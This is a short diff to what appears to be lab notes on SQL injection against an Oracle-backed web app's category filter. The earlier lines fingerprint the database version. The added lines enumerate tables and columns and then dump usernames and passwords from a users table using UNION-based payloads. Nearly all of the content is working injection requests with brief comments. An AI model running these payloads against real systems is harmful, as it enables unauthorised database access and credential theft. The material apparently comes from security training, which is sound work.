@@ -11,3 +11,13 @@ GET /filter?category=Pets' union select 'a', 'b' from dual--
 // Get Oracle version...
 GET /filter?category=Pets' union select banner, null from v$version--
 
+// Get all tables from DB
+GET /filter?category=Lifestyle' union select table_name, null from all_tables--
+
+// Get table columns
+GET /filter?category=Lifestyle' union select column_name, null from all_tab_columns where table_name = 'USERS_PXGXJB'--
+
+// Get data from table
+GET /filter?category=Lifestyle' union select USERNAME_ACQCGX, PASSWORD_AHLJCT from USERS_PXGXJB--
+
+
